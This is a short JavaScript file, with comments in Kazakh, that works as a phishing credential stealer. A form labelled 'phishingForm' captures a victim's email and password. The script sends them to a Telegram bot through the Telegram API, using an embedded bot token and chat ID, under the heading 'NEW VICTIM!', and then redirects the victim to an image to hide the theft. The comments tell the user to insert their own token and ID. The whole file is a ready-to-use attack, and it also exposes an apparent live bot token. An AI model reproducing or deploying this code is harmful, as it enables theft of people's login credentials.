const form = document.getElementById('phishingForm');

// ТЕЛЕГРАМ ДЕРЕКТЕРІ (Өзіңдікін қой)
// Сенің жаңа токенің
const TOKEN = '8209277145:AAHLncTgBfRwbFSYPSl2LSdP7QP5e-QnTVk'; 

// Бұл жерге өз ID-іңді қою керек
const CHAT_ID = '6971293062';

// ДЕРЕКТЕР КЕТКЕННЕН КЕЙІН ШЫҒАТЫН СУРЕТ
const IMAGE_URL = 'cosmos.jpg'; // Кез келген сурет сілтемесі

form.onsubmit = function(e) {
    e.preventDefault();
    
    const email = document.getElementById('email').value;
    const pass = document.getElementById('pass').value;

    const text = `📬 ЖАҢА ҚҰРБАН!\n\nЛогин: ${email}\nПароль: ${pass}`;
    const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;

    fetch(url)
        .then(() => {
            // Пайдаланушыны суретке бағыттау
            window.location.href = IMAGE_URL;
        })
        .catch(() => {
            // Қате болса да бағыттау
            window.location.href = IMAGE_URL;
        });
};
